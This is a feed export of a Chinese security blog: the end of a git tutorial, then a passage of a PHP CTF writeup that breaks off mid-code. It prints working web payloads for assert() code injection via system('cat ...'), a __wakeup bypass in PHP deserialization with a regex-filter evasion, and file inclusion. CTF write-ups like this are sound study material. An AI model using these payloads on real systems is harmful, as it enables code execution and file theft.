class="bash"> git checkout -b issue-101</span></span><br><span class="line"></span><br><span class="line">`修复Bug（手动修复）`</span><br><span class="line"></span><br><span class="line">`从bug分支上切换到存在Bug的分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch [branchName]</span></span><br><span class="line"></span><br><span class="line">`合并分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merged bug fix 101"</span> issue-101</span></span><br><span class="line"></span><br><span class="line">`切换到干活的分支`</span><br><span class="line"></span><br><span class="line">`查看当前分支的工作现场`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash list</span></span><br><span class="line"></span><br><span class="line">`恢复当前分支的工作现场（stash内容并不删除）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash apply</span></span><br><span class="line"></span><br><span class="line">`恢复当前分支的工作现场（stash内容删除）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash pop</span></span><br><span class="line"></span><br><span class="line">`在不同的分支上同步修改bug的操作`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git cherry-pick 4c805e2(master的sha1值)</span></span><br><span class="line"></span><br><span class="line">`推送分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin <span class="string">"branchName"</span></span></span><br><span class="line"></span><br><span class="line">`抓取分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git pull</span></span><br><span class="line">等价于：git fetch   git merge &lt;Branch Name&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、Git-教程&quot;&gt;&lt;a href=&quot;#一、Git-教程&quot; class=&quot;headerlink&quot; title=&quot;一、Git 教程&quot;&gt;&lt;/a&gt;一、Git 教程&lt;/h3&gt;&lt;h4 id=&quot;1-Git-介绍&quot;&gt;&lt;a href=&quot;#1-Git-介绍&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PHP相关题目writeup（持续更新）</title>
    <link href="https://muzibing.github.io/2020/07/28/2020.07.28%EF%BC%88142%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/28/2020.07.28（142）/</id>
    <published>2020-07-27T16:00:00.000Z</published>
    <updated>2020-08-17T14:28:15.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-函数漏洞问题"><a href="#0x00-函数漏洞问题" class="headerlink" title="0x00 函数漏洞问题"></a><font color="navy"><code>0x00 函数漏洞问题</code></font></h2><h3 id="【Jarvois-OJ-web】BabyPHP"><a href="#【Jarvois-OJ-web】BabyPHP" class="headerlink" title="【Jarvois OJ-web】BabyPHP"></a><font color="blue"><code>【Jarvois OJ-web】BabyPHP</code></font></h3><h4 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><p><img src="/images/142-1.png" alt></p><h4 id="2-GIT-源码泄露"><a href="#2-GIT-源码泄露" class="headerlink" title="2.GIT 源码泄露"></a><code>2.GIT 源码泄露</code></h4><p>通过上图的提示，我们猜测是不是可以通过git泄露源码，从而进行得到php代码，有关GIT源码泄露的可以<a href="https://www.jianshu.com/p/edae09535ea3" target="_blank" rel="noopener">点击这里</a>，有关git的介绍可以<a href="https://muzibing.github.io/2020/07/29/2020.07.29（143）/">点击这里</a>，下面我们得到如下的文件及文件夹：</p><p><img src="/images/142-2.jpg" alt></p><h4 id="3-查看index-php源码"><a href="#3-查看index-php源码" class="headerlink" title="3.查看index.php源码"></a><code>3.查看index.php源码</code></h4><p>打开index.php源码，可以得到其中最为关键的一段代码，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>也就是说把我们输入的page相关字符串解析为<code>assert(&quot;strpos(&#39;templates/payload.php&#39;, &#39;..&#39;) === false&quot;)</code>，其中：</p><ul><li>strpos()：查找 “..” 在file字符串中第一次出现的位置，也就是说我们不能使用目录注入了</li><li>assert()：检查一个断言是否为 <strong><code>FALSE</code></strong>，如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</li></ul></blockquote><h4 id="4-构造payload"><a href="#4-构造payload" class="headerlink" title="4.构造payload"></a><code>4.构造payload</code></h4><blockquote><p>根据上文，我们可以构造如下payload：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1：page = <span class="string">'.system("cat templates/flag.php").'</span></span><br><span class="line">payload2：page = <span class="string">','</span>..<span class="string">')===False and system('</span>cat templates/flag.php<span class="string">');//</span></span><br></pre></td></tr></table></figure><blockquote><p>被运行时，在index.php中被执行的形式为：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="string">"templates'.system("</span>cat templates/flag.php<span class="string">").'.php"</span>;</span><br><span class="line">assert(<span class="string">"strpos('templates'.system("</span>cat templates/flag.php<span class="string">").'.php"</span><span class="string">', '</span>..<span class="string">') === false") or die("Detected hacking attempt!");</span></span><br><span class="line"><span class="string">assert("file_exists('</span>templates<span class="string">'.system("cat templates/flag.php").'</span>.php<span class="string">')") or die("That file doesn'</span>t exist!<span class="string">");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$file = "</span><span class="string">','</span>..<span class="string">')===False and system('</span>cat templates/flag.php<span class="string">');//"</span></span><br><span class="line"><span class="string">assert("strpos('</span><span class="string">','</span>..<span class="string">')===False and system('</span>cat templates/flag.php<span class="string">');//'</span>, <span class="string">'..'</span>) === <span class="keyword">false</span><span class="string">") or die("</span>Detected hacking attempt!<span class="string">");</span></span><br><span class="line"><span class="string">assert("</span>file_exists(<span class="string">''</span>,<span class="string">'..'</span>)===<span class="keyword">False</span> <span class="keyword">and</span> system(<span class="string">'cat templates/flag.php'</span>);<span class="comment">//')") or die("That file doesn't exist!");</span></span><br></pre></td></tr></table></figure><blockquote><p>注：不是很明白为什么这样构造</p></blockquote><h2 id="0x01-反序列化问题"><a href="#0x01-反序列化问题" class="headerlink" title="0x01 反序列化问题"></a><font color="navy"><code>0x01 反序列化问题</code></font></h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a><code>基础知识</code></h3><blockquote><p>要想知道反序列化问题，就必须知道 1) 序列化后的数据格式；2) 触发/绕过魔术函数的方法；</p><p><code>问题一：序列化后的数据格式</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;?php</span> </span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">tes1t</span></span></span><br><span class="line"><span class="class">&gt; </span>&#123;</span><br><span class="line">&gt; <span class="keyword">private</span> $flag = <span class="string">"Inactive"</span>;</span><br><span class="line">&gt; <span class="keyword">protected</span> $test = <span class="string">"test"</span>;</span><br><span class="line">&gt; <span class="keyword">public</span> $test1 = <span class="string">"test1"</span>;</span><br><span class="line">&gt; <span class="keyword">protected</span> $test2 = <span class="string">"test2"</span>;</span><br><span class="line">&gt; <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_flag</span><span class="params">($flag)</span></span></span><br><span class="line"><span class="function">&gt; </span>&#123;</span><br><span class="line">&gt; <span class="keyword">$this</span>-&gt;flag = $flag;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; $object = <span class="keyword">new</span> tes1t();</span><br><span class="line">&gt; $object-&gt;set_flag(<span class="string">"Inactive"</span>);</span><br><span class="line">&gt; $data = serialize($object);</span><br><span class="line">&gt; <span class="keyword">echo</span> $data;</span><br><span class="line">&gt; <span class="meta">?&gt;</span> </span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>上述代码产生的数据格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; O:<span class="number">5</span>:<span class="string">"tes1t"</span>:<span class="number">4</span>:&#123;s:<span class="number">11</span>:<span class="string">"tes1tflag"</span>;s:<span class="number">8</span>:<span class="string">"Inactive"</span>;s:<span class="number">7</span>:<span class="string">"*test"</span>;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">5</span>:<span class="string">"test1"</span>;s:<span class="number">5</span>:<span class="string">"test1"</span>;s:<span class="number">8</span>:<span class="string">"*test2"</span>;s:<span class="number">5</span>:<span class="string">"test2"</span>;&#125; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>其中：</p><ul><li>O：表示一个对象</li><li>5：表示对象名占4个字符</li><li>“teslt”：表示对象名</li><li>4：表示该对象有4个属性（不含方法）</li><li>private：tesltflag =&gt; %00teslt%00flag</li><li>protected：<em>test =&gt; %00\</em>%00test</li></ul><p><code>问题二：触发/绕过魔术函数的方法</code></p><p>首先介绍一下魔术方法：</p><ul><li><strong>construct()</strong>：当对象创建时会自动调用(但在unserialize()时是不会自动调用的)</li><li><strong>wakeup()</strong>：unserialize()时会自动调用，反序列化无论如何都是要先调用<code>__wakeup</code>函数的，但是当属性数值&gt;属性真实个数时，就会跳过执行__wakeup()函数<ul><li><strong>存在漏洞的PHP版本</strong>：PHP5.6.25之前版本和7.0.10之前的7.x版本</li><li><strong>漏洞概述</strong>：<code>__wakeup()</code>魔法函数被绕过,导致执行了一些非预期效果的漏洞</li><li><strong>漏洞原理</strong>：<code>当对象的属性(变量)数大于实际的个数时,__wakeup()魔法函数被绕过</code></li></ul></li><li><strong>destruct()</strong>：当对象被销毁时会自动调用</li><li><strong>toString()</strong>：当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</li><li><strong>get()</strong>：当从不可访问的属性读取数据</li><li><strong>call()</strong>：在对象上下文中调用不可访问的方法时触发</li></ul><p>从序列化到反序列化这几个函数的执行过程是：<code>先调用__construct()-&gt;__sleep-&gt;__wakeup()-&gt;__toString ()-&gt;__destruct()</code></p></blockquote><h3 id="【XCTF-web】unserialize3"><a href="#【XCTF-web】unserialize3" class="headerlink" title="【XCTF-web】unserialize3"></a><font color="blue"><code>【XCTF-web】unserialize3</code></font></h3><h4 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><h4 id="2-题目分析"><a href="#2-题目分析" class="headerlink" title="2.题目分析"></a><code>2.题目分析</code></h4><blockquote><p>这里需要进行反序列化，并且要绕过 <code>__wakeup</code> 魔术函数，这里需要的知识点有：</p><ol><li>将数据序列化后的数据格式是什么样子？</li><li>如何绕过<code>__wakeup</code>函数？</li></ol></blockquote><h4 id="3-构造payload"><a href="#3-构造payload" class="headerlink" title="3.构造payload"></a><code>3.构造payload</code></h4><p>从上面的基础知识可以得到序列化后的数据格式，并且<code>当对象的属性(变量)数大于实际的个数时，__wakeup()魔法函数被绕过</code>，那么这里我们就可以构造出payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;,s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure><p>得到如下flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the answer is : cyberpeace&#123;7d67cd73e3c53d91d218d6a75563f5e3&#125;</span><br></pre></td></tr></table></figure><h3 id="【XCTF-web】Web-php-unserialize27"><a href="#【XCTF-web】Web-php-unserialize27" class="headerlink" title="【XCTF-web】Web_php_unserialize27"></a><font color="blue"><code>【XCTF-web】Web_php_unserialize27</code></font></h3><h4 id="1-题目描述-2"><a href="#1-题目描述-2" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-题目分析-1"><a href="#2-题目分析-1" class="headerlink" title="2.题目分析"></a><code>2.题目分析</code></h4><p>我们一部分一部分的分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var = base64_decode($_GET[<span class="string">'var'</span>]);</span><br></pre></td></tr></table></figure><blockquote><p>对我们输入的payload进行base64解码，也就是说我们输入的payload要经过base64编码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var))</span><br></pre></td></tr></table></figure><blockquote><p>也就是说我们解码后的输入的形式如果是<code>[oc]:\d+:</code>（不区分大小写）则会输出<code>stop hacking</code>，但是如果我们的输入是<code>O:+4:</code>，就可以绕过正则过滤</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@unserialize($var);</span><br></pre></td></tr></table></figure><blockquote><p>反序列化我们的var值</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><blockquote><p>如果执行反序列化，那么就得执行该函数，所以和上一道题目一样，我们需要绕过该函数。</p></blockquote><h4 id="3-构造payload-1"><a href="#3-构造payload-1" class="headerlink" title="3.构造payload"></a><code>3.构造payload</code></h4><p>根据上文分析，我们可以构造如下的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+<span class="number">4</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">"\x00Demo\x00file"</span>;s:<span class="number">8</span>:<span class="string">"fl4g.php"</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>但是我们需要将其进行base64编码，这里就需要注意一个常见的坑，就是<code>private</code>属性的名字填写，两边要有两个<code>\x00</code>，这个时候我们不能直接将其进行base64编码，所以我们要将其用十六进制形式打开，改掉里面的内容，或者用下面的脚本进行修改：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"2.txt"</span>,<span class="string">"r+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        line = line.strip(<span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(line)):</span><br><span class="line">            s += line[i]</span><br><span class="line">            <span class="keyword">if</span> i &lt; len(line) - <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> (line[i+<span class="number">1</span>] == <span class="string">"D"</span> <span class="keyword">and</span> line[i<span class="number">-2</span>] == <span class="string">"0"</span>) <span class="keyword">or</span> (line[i] == <span class="string">"o"</span> <span class="keyword">and</span> line[i+<span class="number">1</span>] == <span class="string">"f"</span>):</span><br><span class="line">                    s += chr(int(<span class="string">"0x00"</span>,<span class="number">16</span>))</span><br><span class="line">                    print(<span class="string">"1"</span>)</span><br><span class="line">    print(base64.b64encode(bytes(s,encoding=<span class="string">"gbk"</span>)))</span><br></pre></td></tr></table></figure></p><p>得到如下flag：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-文件包含问题"><a href="#0x02-文件包含问题" class="headerlink" title="0x02 文件包含问题"></a><font color="navy"><code>0x02 文件包含问题</code></font></h2><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a><font color="blue"><code>基础知识</code></font></h3><p><a href="https://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="noopener">参考链接</a></p><blockquote><p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。注意：<code>如果被包含的文件中无有效的php代码，则会直接把文件内容输出。</code></p><p>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。常见包含函数有：<code>include()</code>、<code>require()</code>，这两者的区别有：</p><ol><li><code>include</code> 是当代码执行到它的时候才加载文件，发生错误的时候只是给一个警告，然后继续往下执行</li><li><code>require</code> 是只要程序一执行就会立即调用文件，发生错误的时候会输出错误信息，并且终止脚本的运行</li></ol><p>require一般是用于文件头包含类文件、数据库等等文件，include一般是用于包含html模版文件<br>include_once()、require_once()与(include\require)的功能相同，只是区别于当重复调用的时候，它只会调用一次</p></blockquote><h3 id="【XCTF-web】warmup"><a href="#【XCTF-web】warmup" class="headerlink" title="【XCTF-web】warmup"></a><font color="blue"><code>【XCTF-web】warmup</code></font></h3><h4 id="1-题目描述-3"><a href="#1-题目描述-3" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><p><img src="/images/142-3.png" alt></p><blockquote><p>从上图可以看出，题目给出的网址打开之后只出现一个大大的笑脸，F12打开源码看见被注释掉了一段“source.php”，我们下面打开该网址，得到如下PHP源码：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-题目分析-2"><a href="#2-题目分析-2" class="headerlink" title="2.题目分析"></a><code>2.题目分析</code></h4><p>我们从上文源码中可以看到，还有一个<code>hint.php</code>文件，我们打开一下看看里面有什么提示信息，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><blockquote><p>从上文可以看出我们要的flag在ffffllllaaaagggg文件中，那么我们可能需要遍历目录查找该文件。</p></blockquote><p>下面我们分析上面的PHP源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>]) &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>]) &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>]))</span><br></pre></td></tr></table></figure><blockquote><p>如果同时满足上述三个条件，即可执行文件包含漏洞，这三个条件分别是：</p><ol><li>输入的字符串要为非空（因为如果输入的字符串是非空，empty返回False，那么!empty是True）</li><li>is_string()：要求输入的是字符串是字符串</li><li>要满足checkFile函数返回的是True</li></ol><p>下面我们就分析一下checkFile，我们要使得他的返回值为True</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>要求我们的输入为非空字符串</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span 